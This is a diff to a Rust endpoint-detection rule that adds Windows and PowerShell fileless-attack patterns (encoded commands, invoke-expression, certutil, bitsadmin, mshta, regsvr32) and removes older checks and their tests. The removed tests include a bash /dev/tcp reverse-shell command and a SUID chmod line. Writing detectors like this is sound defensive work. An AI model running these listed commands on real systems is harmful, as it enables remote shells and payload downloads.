@@ -7,6 +7,7 @@ use crate::events::{EventType, NormalizedEvent, Severity};
 pub struct SuspiciousProcessRule {
     suspicious_interpreters: Vec<&'static str>,
     suspicious_cmdline_patterns: Vec<&'static str>,
+    windows_cmdline_patterns: Vec<&'static str>,
     suspicious_names: Vec<&'static str>,
     high_confidence_tools: Vec<&'static str>,
 }
@@ -39,6 +40,25 @@ impl SuspiciousProcessRule {
                 "chmod +s",
                 "chmod u+s",
                 "chmod 4",
+            ],
+            windows_cmdline_patterns: vec![
+                "-encodedcommand",
+                "-enc ",
+                "-ec ",
+                "-w hidden",
+                "-windowstyle hidden",
+                "-nop",
+                " iex ",
+                "iex (",
+                "invoke-expression",
+                "downloadstring",
+                "frombase64string",
+                "wscript //b",
+                "mshta vbscript:",
+                "rundll32 javascript:",
+                "regsvr32 /i:http",
+                "certutil -urlcache",
+                "bitsadmin /transfer",
             ],
             suspicious_names: vec![
                 "mshta.exe",
@@ -75,6 +95,20 @@ impl SuspiciousProcessRule {
     fn check_suspicious_cmdline(&self, cmdline: &str) -> Option<&'static str> {
         let lower = cmdline.to_lowercase();
         self.suspicious_cmdline_patterns
+            .iter()
+            .find(|&&pattern| lower.contains(pattern))
+            .copied()
+    }
+
+    /// Windows-specific command-line patterns (LOLBAS / PowerShell
+    /// fileless-attack indicators). MITRE: T1059.001 (PowerShell), T1027
+    /// (obfuscated files), T1105 (ingress tool transfer).
+    fn check_windows_cmdline(&self, cmdline: &str) -> Option<&'static str> {
+        if cmdline.is_empty() {
+            return None;
+        }
+        let lower = cmdline.to_lowercase();
+        self.windows_cmdline_patterns
             .iter()
             .find(|&&pattern| lower.contains(pattern))
             .copied()
@@ -254,6 +288,28 @@ impl Rule for SuspiciousProcessRule {
         let exe = proc.exe.as_deref().unwrap_or("");
         let cmdline = proc.cmdline.as_deref().unwrap_or("");
 
+        // Windows command-line indicators (PowerShell obfuscation, LOLBAS
+        // download-and-execute) — fires now that the Windows collector
+        // captures full command lines via the PEB.
+        if let Some(pattern) = self.check_windows_cmdline(cmdline) {
+            return Some(
+                Alert::from_rule(
+                    event.event_id,
+                    self.id(),
+                    Severity::High,
+                    format!("Suspicious Windows command: {}", proc.name),
+                    format!(
+                        "Process '{}' (PID {}) executed with suspicious pattern: '{pattern}' in command line: {}",
+                        proc.name, proc.pid, cmdline
+                    ),
+                    0.9,
+                )
+                .with_factor("pattern_match", 1.0, pattern)
+                .with_mitre("T1059.001")
+                .with_mitre("T1027"),
+            );
+        }
+
         // Check suspicious command line patterns first (higher confidence)
         if let Some(pattern) = self.check_suspicious_cmdline(cmdline) {
             let severity = if pattern.contains("/dev/tcp")
@@ -288,8 +344,8 @@ impl Rule for SuspiciousProcessRule {
             );
         }
 
-        // Known attack/admin tooling by process name (works on Windows where
-        // cmdline is not captured by the Toolhelp snapshot collector)
+        // Known attack/admin tooling by process name (also covers Windows
+        // events whose command line could not be read)
         if let Some(tool) = self.check_suspicious_name(&proc.name, exe) {
             let severity = if self.high_confidence_tools.contains(&tool) {
                 Severity::High
@@ -359,151 +415,3 @@ impl Rule for SuspiciousProcessRule {
                 );
             }
         }
-
-        // Execution from world-writable or user-writable locations
-        if !exe.is_empty()
-            && let Some(reason) = self.check_suspicious_location(exe)
-        {
-            return Some(
-                Alert::from_rule(
-                    event.event_id,
-                    self.id(),
-                    Severity::High,
-                    format!("Suspicious execution location: {}", proc.name),
-                    format!(
-                        "Process '{}' (PID {}) running from {reason}: '{exe}'",
-                        proc.name, proc.pid
-                    ),
-                    0.7,
-                )
-                .with_factor("location", 1.0, reason)
-                .with_mitre("T1036"),
-            );
-        }
-
-        // Check suspicious parent-child relationship
-        if let Some(ppid) = proc.ppid
-            && let Some(reason) = self.check_suspicious_parent_child(ppid, &proc.name, exe)
-        {
-            return Some(
-                Alert::from_rule(
-                    event.event_id,
-                    self.id(),
-                    Severity::High,
-                    format!("Suspicious parent-child: {reason}"),
-                    format!(
-                        "Process '{}' (PID {}) has suspicious lineage: {reason}",
-                        proc.name, proc.pid
-                    ),
-                    0.75,
-                )
-                .with_factor("parent_child", 1.0, &reason)
-                .with_mitre("T1059"),
-            );
-        }
-
-        // Check suspicious interpreter execution (lower priority)
-        if let Some(interp) = self.check_suspicious_interpreter(exe, &proc.name) {
-            // Only flag if the interpreter was spawned by something unusual
-            // Just running python/curl alone is not suspicious enough to alert
-            if proc.ppid.is_some_and(|p| p <= 2) {
-                return None; // spawned by init/kthreadd — normal
-            }
-
-            // Only alert on network tools, not general interpreters
-            let network_tools = ["nc", "ncat", "netcat", "socat", "nmap", "masscan"];
-            if !network_tools.contains(&interp) {
-                return None;
-            }
-
-            return Some(
-                Alert::from_rule(
-                    event.event_id,
-                    self.id(),
-                    Severity::Medium,
-                    format!("Network tool executed: {interp}"),
-                    format!(
-                        "Network reconnaissance/tunneling tool '{}' (PID {}) was executed",
-                        proc.name, proc.pid
-                    ),
-                    0.6,
-                )
-                .with_factor("tool_type", 1.0, "network tool")
-                .with_mitre("T1059"),
-            );
-        }
-
-        None
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use crate::events::{OsType, ProcessContext};
-
-    fn proc_event(name: &str, exe: &str, cmdline: &str, ppid: u32) -> NormalizedEvent {
-        NormalizedEvent::new(
-            "ep".into(),
-            OsType::Linux,
-            EventType::Process,
-            Severity::Info,
-        )
-        .with_process(ProcessContext {
-            pid: 1234,
-            ppid: Some(ppid),
-            name: name.into(),
-            exe: Some(exe.into()),
-            cmdline: Some(cmdline.into()),
-            uid: Some(1000),
-            username: None,
-            start_time: None,
-            children_pids: vec![],
-        })
-    }
-
-    #[test]
-    fn detects_reverse_shell_pattern() {
-        let mut rule = SuspiciousProcessRule::new();
-        let event = proc_event(
-            "bash",
-            "/usr/bin/bash",
-            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-            100,
-        );
-        let alert = rule.evaluate(&event).unwrap();
-        assert_eq!(alert.severity, Severity::High);
-        assert!(alert.mitre_techniques.contains(&"T1059.004".to_string()));
-    }
-
-    #[test]
-    fn detects_suid_bit_setting() {
-        let mut rule = SuspiciousProcessRule::new();
-        let event = proc_event("chmod", "/usr/bin/chmod", "chmod +s /tmp/exploit", 100);
-        let alert = rule.evaluate(&event).unwrap();
-        assert_eq!(alert.severity, Severity::High);
-    }
-
-    #[test]
-    fn detects_network_tool() {
-        let mut rule = SuspiciousProcessRule::new();
-        let event = proc_event("nmap", "/usr/bin/nmap", "nmap -sS 192.168.1.0/24", 100);
-        let alert = rule.evaluate(&event).unwrap();
-        assert!(alert.title.contains("nmap"));
-    }
-
-    #[test]
-    fn ignores_normal_process() {
-        let mut rule = SuspiciousProcessRule::new();
-        let event = proc_event("ls", "/usr/bin/ls", "ls -la /home", 100);
-        assert!(rule.evaluate(&event).is_none());
-    }
-
-    #[test]
-    fn ignores_non_process_events() {
-        let mut rule = SuspiciousProcessRule::new();
-        let event =
-            NormalizedEvent::new("ep".into(), OsType::Linux, EventType::File, Severity::Info);
-        assert!(rule.evaluate(&event).is_none());
-    }
-}
